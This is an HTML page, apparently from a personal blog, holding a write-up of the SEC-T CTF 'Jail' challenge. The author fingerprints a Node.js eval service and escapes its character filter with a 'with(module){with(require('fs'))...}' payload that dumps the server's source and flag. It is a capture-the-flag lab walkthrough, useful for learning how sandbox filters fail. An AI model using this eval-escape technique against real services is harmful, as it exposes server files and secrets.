@@ -1,0 +1,291 @@
+<!doctype html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://unpkg.com/purecss@2.0.3/build/pure-min.css" integrity="sha384-cg6SkqEOCV1NbJoCu11+bm0NvBRc8IYLRGXkmNrqUBfTjmMYwNKPWBTIKyw9mHNJ" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/purecss@2.0.3/build/grids-responsive-min.css">
+  <link rel="stylesheet" href="/assets/styles.css"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>[SEC-T CTF]Jail writeup | elephacking</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="[SEC-T CTF]Jail writeup" />
+<meta name="author" content="Elephacking" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="This is an interesting challenge… I through I knew JavaScript before this game but at the end of it I found out that there are still things I can learn." />
+<meta property="og:description" content="This is an interesting challenge… I through I knew JavaScript before this game but at the end of it I found out that there are still things I can learn." />
+<link rel="canonical" href="https://blog.hitlab.space/2017/09/17/SEC-T-CTF-Jail-writeup/" />
+<meta property="og:url" content="https://blog.hitlab.space/2017/09/17/SEC-T-CTF-Jail-writeup/" />
+<meta property="og:site_name" content="elephacking" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2017-09-17T00:00:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="[SEC-T CTF]Jail writeup" />
+<meta name="twitter:site" content="@<hidden>" />
+<meta name="twitter:creator" content="@Elephacking" />
+<meta name="google-site-verification" content="xxxxx" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"https://blog.hitlab.space/2017/09/17/SEC-T-CTF-Jail-writeup/","headline":"[SEC-T CTF]Jail writeup","dateModified":"2017-09-17T00:00:00+08:00","datePublished":"2017-09-17T00:00:00+08:00","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://blog.hitlab.space/assets/icons/favicon.ico"},"name":"Elephacking"},"author":{"@type":"Person","name":"Elephacking"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.hitlab.space/2017/09/17/SEC-T-CTF-Jail-writeup/"},"description":"This is an interesting challenge… I through I knew JavaScript before this game but at the end of it I found out that there are still things I can learn.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="https://blog.hitlab.space/feed.xml" title="elephacking" />
+</head>
+
+
+  <body>
+
+    <div class="container pure-g"><div class="sidebar-left pure-u-1 pure-u-md-1-4" style="background-color: rgb(40, 73, 77); color: rgb(255, 255, 255); background-image: url(/assets/img/sidebar-bg.jpg);"><header class="masthead">
+  <div class="avatar"><img src="/assets/icons/logo.png" class="avatar-image" alt="Elephacking">
+    </div>
+  <div class="masthead-title">
+    <a href="/" title="Home">elephacking</a>
+  </div>
+  <div class="masthead-tagline">
+    <small>A Slave, a Security Fans, a Pentester, a Red Teamer - 隨便寫寫Cyber Security，在大學學到的東西和工作學到的東西 - I am moving my posts from the old blog to jekyll... -</small>
+  </div><nav class="navigation">
+    <ul class="navigation-list"><li class="navigation-item">
+        <a onclick="sessionStorage.setItem('forceCheckScroll', 'true')" href="/">Blog</a>
+      </li><li class="navigation-item">
+        <a onclick="sessionStorage.setItem('forceCheckScroll', 'true')" href="/about/">About</a>
+      </li></ul>
+  </nav><div class="social pure-menu pure-menu-horizontal">
+      <ul class="social-icons pure-menu-list">
+      <li class="pure-menu-item">
+          <a class="social-icon pure-menu-link" href="mailto://elephacking@gmail.com">
+            <i class="fas fa-envelope" title="Email"></i>
+          </a>
+        </li><li class="pure-menu-item">
+          <a class="social-icon pure-menu-link" href="https://github.com/elephacking">
+            <i class="fab fa-github" title="GitHub"></i>
+          </a>
+        </li>
+      </ul>
+    </div>
+</header>
+</div>
+
+      <div class="content pure-u-1 pure-u-md-1-2"><main>
+  <article class="post">
+  <h1 class="post-title">[SEC-T CTF]Jail writeup</h1>
+  <div class="post-meta"><time datetime="2017-09-17T00:00:00+08:00" itemprop="datePublished">17 Sep 2017</time></div>
+
+  <p>This is an interesting challenge… I through I knew JavaScript before this game but at the end of it I found out that there are still things I can learn.</p>
+
+<p>Question:</p>
+
+<h1 id="jail--pwn-200--0">Jail – Pwn (200 + 0)</h1>
+<p>Joey gave you the disk with the file on it and now you’re in jail. They’re charging you with some serious shit, man! Better figure out a way to escape.</p>
+
+<p>Solves: 43</p>
+
+<p>Service: <a href="jail.alieni.se:55542" title="jail.alieni.se:55542">jail.alieni.se:55542</a></p>
+
+<p>Author: avlidienbrunn</p>
+
+<p>Once I nc to the server, it showed the following screen
+<a href="/assets/jail1_template.png" title="jail1_template"><img src="/assets/jail1_template.png" alt="jail1_template" title="jail1_template" /></a></p>
+
+<p>I tried to enter some character like 555-4202, it showed the following screen</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Phone #&gt; 555-4202
+Calling -3647... Nobody picks up!
+</code></pre></div></div>
+<p>Cool! It looked like an eval function is used in this program.  But I still didn’t know the programming language.</p>
+
+<p>Next, I tried to enter the following</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo -e '\n12345' | nc jail.alieni.se 55542
+
+Phone #&gt;
+Calling undefined... Nobody picks up!
+</code></pre></div></div>
+<p>keyword <strong>undefined</strong> obtained! Which language will return undefined? The first thing came to my mind was JavaScript!</p>
+
+<p>So I tried the following</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Phone #&gt; console.log('123');
+Dangerous characters detected
+</code></pre></div></div>
+<p>Seems there was some filtering function before the program eval the answer. After some trying, I found this</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Phone #&gt; this
+Calling function call(number) {
+        var hangup = process.exit;
+        var line = "";
+
+        if(number == 911){
+            console.log("Invalid number");
+            ask();
+            return;
+        }
+
+        var flag,Array,Boolean,Date,global,Error,EvalError,Function,Number,Object,RangeError,ReferenceError,String,SyntaxError,TypeError,URIError,decodeURI,decodeURIComponent,encodeURI,encodeURIComponent,isFinite,isNaN,parseFloat,parseInt,ArrayBuffer,Buffer,DTRACE_HTTP_CLIENT_REQUEST,DTRACE_HTTP_CLIENT_RESPONSE,DTRACE_HTTP_SERVER_REQUEST,DTRACE_HTTP_SERVER_RESPONSE,DTRACE_NET_SERVER_CONNECTION,DTRACE_NET_STREAM_END,DataView,Float32Array,Float64Array,Int16Array,Int32Array,Int8Array,Map,Promise,Proxy,Set,Symbol,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray,WeakMap,WeakSet,assert,clearImmediate,clearInterval,clearTimeout,escape,events,require,setImmediate,setInterval,setTimeout,stream,unescape,__defineGetter__,__defineSetter__,__lookupGetter__,__lookupSetter__,constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf;
+
+        if(new RegExp(/[\[\]\.\\]/).test(number)){
+            console.log("Dangerous characters detected");
+            hangup();
+            return;
+        }
+
+        arguments = undefined;
+
+        console.log("Calling "+eval(number)+"... Nobody picks up!");
+        hangup();
+    }... Nobody picks up!
+</code></pre></div></div>
+<p>Ok, the filter function was clear.  The default functions were redefined to undefined by the <a href="https://developer.mozilla.org/cs/docs/Web/JavaScript/Reference/Functions" title="function scoping feature">function scoping feature</a> of JavaScript.  And the <code class="language-plaintext highlighter-rouge">'[',']','.'</code> were filtered by the RegExp.</p>
+
+<p>So, it <em>seems</em> all the function call were blocked.  But, is it real?</p>
+
+<p>At the time I learnt the programming language VBScript at the very first beginning, there was a magic statement called ‘with’.  Thanks to ECMAScript 262, <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with" title="with">with</a> is also defined in JavaScript!</p>
+
+<p>HAHA, the poc</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Phone</span> <span class="err">#</span><span class="o">&gt;</span> <span class="kd">with</span> <span class="p">(</span><span class="nx">module</span><span class="p">)</span> <span class="p">{</span> <span class="kd">with</span> <span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span> <span class="nx">readFileSync</span><span class="p">(</span><span class="nx">__filename</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span>
+<span class="nx">Calling</span> <span class="kd">var</span> <span class="nx">flag</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">SECT{1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,}</span><span class="dl">"</span>
+<span class="kd">var</span> <span class="nx">readline</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">readline</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">rl</span> <span class="o">=</span> <span class="nx">readline</span><span class="p">.</span><span class="nx">createInterface</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">stdin</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">stdout</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">Jail</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">rv</span> <span class="o">=</span> <span class="p">{};</span>
+
+    <span class="kd">function</span> <span class="nx">call</span><span class="p">(</span><span class="nx">number</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">hangup</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">;</span>
+        <span class="kd">var</span> <span class="nx">line</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="nx">number</span> <span class="o">==</span> <span class="mi">911</span><span class="p">){</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Invalid number</span><span class="dl">"</span><span class="p">);</span>
+            <span class="nx">ask</span><span class="p">();</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="kd">var</span> <span class="nx">flag</span><span class="p">,</span><span class="nb">Array</span><span class="p">,</span><span class="nb">Boolean</span><span class="p">,</span><span class="nb">Date</span><span class="p">,</span><span class="nb">global</span><span class="p">,</span><span class="nb">Error</span><span class="p">,</span><span class="nx">EvalError</span><span class="p">,</span><span class="nb">Function</span><span class="p">,</span><span class="nb">Number</span><span class="p">,</span><span class="nb">Object</span><span class="p">,</span><span class="nx">RangeError</span><span class="p">,</span><span class="nx">ReferenceError</span><span class="p">,</span><span class="nb">String</span><span class="p">,</span><span class="nx">SyntaxError</span><span class="p">,</span><span class="nx">TypeError</span><span class="p">,</span><span class="nx">URIError</span><span class="p">,</span><span class="nb">decodeURI</span><span class="p">,</span><span class="nb">decodeURIComponent</span><span class="p">,</span><span class="nb">encodeURI</span><span class="p">,</span><span class="nb">encodeURIComponent</span><span class="p">,</span><span class="nb">isFinite</span><span class="p">,</span><span class="nb">isNaN</span><span class="p">,</span><span class="nb">parseFloat</span><span class="p">,</span><span class="nb">parseInt</span><span class="p">,</span><span class="nb">ArrayBuffer</span><span class="p">,</span><span class="nx">Buffer</span><span class="p">,</span><span class="nx">DTRACE_HTTP_CLIENT_REQUEST</span><span class="p">,</span><span class="nx">DTRACE_HTTP_CLIENT_RESPONSE</span><span class="p">,</span><span class="nx">DTRACE_HTTP_SERVER_REQUEST</span><span class="p">,</span><span class="nx">DTRACE_HTTP_SERVER_RESPONSE</span><span class="p">,</span><span class="nx">DTRACE_NET_SERVER_CONNECTION</span><span class="p">,</span><span class="nx">DTRACE_NET_STREAM_END</span><span class="p">,</span><span class="nb">DataView</span><span class="p">,</span><span class="nb">Float32Array</span><span class="p">,</span><span class="nb">Float64Array</span><span class="p">,</span><span class="nb">Int16Array</span><span class="p">,</span><span class="nb">Int32Array</span><span class="p">,</span><span class="nb">Int8Array</span><span class="p">,</span><span class="nb">Map</span><span class="p">,</span><span class="nb">Promise</span><span class="p">,</span><span class="nb">Proxy</span><span class="p">,</span><span class="nb">Set</span><span class="p">,</span><span class="nb">Symbol</span><span class="p">,</span><span class="nb">Uint16Array</span><span class="p">,</span><span class="nb">Uint32Array</span><span class="p">,</span><span class="nb">Uint8Array</span><span class="p">,</span><span class="nb">Uint8ClampedArray</span><span class="p">,</span><span class="nb">WeakMap</span><span class="p">,</span><span class="nb">WeakSet</span><span class="p">,</span><span class="nx">assert</span><span class="p">,</span><span class="nx">clearImmediate</span><span class="p">,</span><span class="nx">clearInterval</span><span class="p">,</span><span class="nx">clearTimeout</span><span class="p">,</span><span class="nx">escape</span><span class="p">,</span><span class="nx">events</span><span class="p">,</span><span class="nx">require</span><span class="p">,</span><span class="nx">setImmediate</span><span class="p">,</span><span class="nx">setInterval</span><span class="p">,</span><span class="nx">setTimeout</span><span class="p">,</span><span class="nx">stream</span><span class="p">,</span><span class="nx">unescape</span><span class="p">,</span><span class="nx">__defineGetter__</span><span class="p">,</span><span class="nx">__defineSetter__</span><span class="p">,</span><span class="nx">__lookupGetter__</span><span class="p">,</span><span class="nx">__lookupSetter__</span><span class="p">,</span><span class="kd">constructor</span><span class="p">,</span><span class="nx">hasOwnProperty</span><span class="p">,</span><span class="nx">isPrototypeOf</span><span class="p">,</span><span class="nx">propertyIsEnumerable</span><span class="p">,</span><span class="nx">toLocaleString</span><span class="p">,</span><span class="nx">toString</span><span class="p">,</span><span class="nx">valueOf</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="sr">/</span><span class="se">[\[\]\.\\]</span><span class="sr">/</span><span class="p">).</span><span class="nx">test</span><span class="p">(</span><span class="nx">number</span><span class="p">)){</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Dangerous characters detected</span><span class="dl">"</span><span class="p">);</span>
+            <span class="nx">hangup</span><span class="p">();</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="nx">arguments</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
+
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Calling </span><span class="dl">"</span><span class="o">+</span><span class="nb">eval</span><span class="p">(</span><span class="nx">number</span><span class="p">)</span><span class="o">+</span><span class="dl">"</span><span class="s2">... Nobody picks up!</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">hangup</span><span class="p">();</span>
+    <span class="p">};</span>
+    <span class="nx">rv</span><span class="p">.</span><span class="nx">call</span> <span class="o">=</span> <span class="nx">call</span><span class="p">;</span>
+    <span class="nx">rv</span><span class="p">.</span><span class="nx">toString</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="nx">rv</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">toString</span><span class="p">()};</span>
+
+    <span class="k">return</span> <span class="nx">rv</span><span class="p">;</span>
+<span class="p">})();</span>
+
+<span class="nx">template</span> <span class="o">=</span> <span class="s2">`_____________________________
+     ||   ||     ||   ||
+     ||   ||, , ,||   ||
+     ||  (||/|/(\/||/  ||
+     ||  ||| _'_´|||  ||
+     ||   || o o ||   ||
+     ||  (||  - ´||)  ||
+     ||   ||  =  ||   ||
+     ||   ||\\___/||   ||
+     ||___||) , (||___||
+    /||---||-\\_/-||---||\\
+   / ||--_||_____||_--|| \\
+  (_(||)-|S555-4202|-(||)_)
+|"""""""""""""""""""""""""""|
+| "You get one call, UNO."  |
+ """""""""""""""""""""""""""
+ Phone #&gt; `</span><span class="p">;</span>
+
+<span class="kd">function</span> <span class="nx">ask</span><span class="p">(){</span>
+    <span class="nx">rl</span><span class="p">.</span><span class="nx">question</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">answer</span><span class="p">){</span>
+        <span class="nx">Jail</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">answer</span><span class="p">);</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+
+<span class="nx">ask</span><span class="p">();</span>
+<span class="p">...</span> <span class="nx">Nobody</span> <span class="nx">picks</span> <span class="nx">up</span><span class="o">!</span>
+</code></pre></div></div>
+<p>Cheers!</p>
+
+
+  
+</article>
+
+
+<aside class="related">
+  <h3>Related posts</h3>
+  <ul class="related-posts">
+    
+      <li>
+        <a href="/2017/09/17/SEC-T-CTF-Joeys-screenshot-writeup/">
+          [SEC-T CTF]Joeys screenshot writeup
+          <small><time datetime="2017-09-17T00:00:00+08:00">17 Sep 2017</time></small>
+        </a>
+      </li>
+    
+      <li>
+        <a href="/2017/09/17/SEC-T-CTF-Jail-2-writeup/">
+          [SEC-T CTF]Jail 2 writeup
+          <small><time datetime="2017-09-17T00:00:00+08:00">17 Sep 2017</time></small>
+        </a>
+      </li>
+    
+      <li>
+        <a href="/2017/09/17/SEC-T-CTF-Black-&-White-Writeup/">
+          [SEC-T CTF]Black & White Writeup
+          <small><time datetime="2017-09-17T00:00:00+08:00">17 Sep 2017</time></small>
+        </a>
+      </li>
+    
+  </ul>
+</aside>
+
+
+</main>
+
+<footer class="footer"><small>
+    &copy; 2017&nbsp;-&nbsp;2021 <a href="https://github.com/elephacking">Elephacking</a>. All rights reserved.
+    Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://github.com/vszhub/not-pure-poole">Not Pure Poole</a>.
+  </small>
+</footer>
+</div>
+      <div class="sidebar-right pure-u-1 pure-u-md-1-4">
+</div>
+    </div>
+
+    <script async src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script><script>
+  function strip(str, remove) {
+    while (str.length > 0 && remove.indexOf(str.charAt(0)) != -1) {
+      str = str.substr(1);
+    }
+    while (str.length > 0 && remove.indexOf(str.charAt(str.length - 1)) != -1) {
+      str = str.substr(0, str.length - 1);
+    }
+    return str;
+  }
+
+  function scroll() {
+    console.log('scroll');
+    window.scrollTo({
+      left: 0, 
+      top: window.innerHeight,
+      behavior: 'smooth'
+    });
+    sessionStorage.removeItem('forceCheckScroll');
+  }
+
+  const forceCheckScroll = sessionStorage.getItem('forceCheckScroll') === 'true';
+  const checkScroll = strip(window.location.pathname, '/') !== strip('', '/');
+
+  if (forceCheckScroll || checkScroll) {
+    const maxWidth = "(max-width: 48rem)";
+    const result = window.matchMedia(maxWidth);
+    if (result.matches) {
+      scroll();
+    } else {
+      result.addListener((match) => {
+        if (match.media == maxWidth) {
+          if (match.matches) {
+            scroll();
+          }
+        }
+      });
+    }
+  }
+</script>
+</body>
+</html>
